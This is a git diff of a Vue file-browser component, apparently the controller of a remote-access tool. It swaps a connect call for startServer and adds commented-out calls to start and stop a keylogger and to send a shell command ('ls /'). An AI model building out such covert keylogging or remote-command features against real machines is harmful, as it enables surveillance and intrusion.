@@ -8,7 +8,7 @@
     @tab-click="handleClickTab($event.name)"
   >
     <el-tab-pane
-      :key="index"
+      :key="item.name"
       v-for="item in editableTabs"
       :label="item.title"
       :name="item.name"
@@ -19,8 +19,8 @@
 
 <script>
 import FileBrowser from './mainComponents/FileBrowser'
-import { connect } from '../../../main/Connect/connect'
-import request from '../../../main/Connect/request/file'
+import { startServer } from '../../../main/Connect/server'
+import request from '../../../main/Connect/request'
 
 export default {
   name: 'browser-page',
@@ -39,7 +39,7 @@ export default {
     }
   },
   mounted () {
-    connect()
+    startServer()
   },
   methods: {
     handleClickTab (route) {
@@ -48,9 +48,18 @@ export default {
       request.getFilePreview().then((packet) => {
         console.log(packet)
       })
-      request.transFile('/User/flag').then((packet) => {
+      request.getFilePreview().then((packet) => {
         console.log(packet)
       })
+      // request.startKeyLogger().then((packet) => {
+      //   console.log(packet)
+      // })
+      // request.stopKeyLogger().then((packet) => {
+      //   console.log(packet)
+      // })
+      // request.sendCommand('ls /').then((packet) => {
+      //   console.log(packet)
+      // })
     },
     removeTab (targetName) {
       // 首页不允许被关闭（为了防止el-tabs栏中一个tab都没有）
